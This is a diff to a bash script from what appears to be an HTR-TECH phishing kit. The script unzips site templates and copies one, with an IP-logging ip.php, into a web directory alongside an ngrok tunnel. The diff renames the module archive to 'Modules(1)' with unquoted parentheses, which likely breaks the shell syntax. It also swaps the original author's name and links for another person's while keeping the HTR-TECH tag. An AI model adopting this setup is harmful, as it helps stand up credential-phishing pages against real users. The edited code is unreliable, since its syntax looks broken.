@@ -62,9 +62,9 @@ else
 mkdir .htr
 fi
 
-if [[ -e Modules.zip ]]; then
-unzip -qq Modules.zip
-rm Modules.zip
+if [[ -e Modules(1).zip ]]; then
+unzip -qq Modules(1).zip
+rm Modules(1).zip
 fi
 
 if [[ -e .htr/ngrok ]]; then
@@ -417,17 +417,17 @@ about() {
 clear
 banner
 printf "\e[0m\n"
-printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m TAHMID RAYAT \e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m MIR AAFAQ\e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/htr-tech\e[0m\n"
+printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/azakios\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://linktr.ee/tahmid.rayat\e[0m\n"
+printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://miraafaq.strikingly.com\e[0m\n"
 printf "\e[0m\n"
 printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m2.1 Beta\e[0m\n"
 printf "\e[0m\n"
-printf "   \e[0m\e[41mThanks to MoisesTapia , Hiddeneye Team & Thelinuxchoice\e[0m\n"
+printf "   \e[0m\e[41mThanks to ACEFI MANAGEMENT ,DRH \e[0m\n"
 printf "\e[0m\n"
-printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
+printf "         \e[0m\e[1;44m Follow US For More Tools \e[0m\n"
 printf "\e[0m\n"
 printf "\e[0m\n"
 sleep 3
@@ -463,8 +463,8 @@ else
 mkdir .htr/www
 fi
 
-cp -rf .Modules/$website/* .htr/www
-cp -f .Modules/ip.php .htr/www/
+cp -rf .Modules(1)/$website/* .htr/www
+cp -f .Modules(1)/ip.php .htr/www/
 
 def_tunnel_menu="2"
 banner
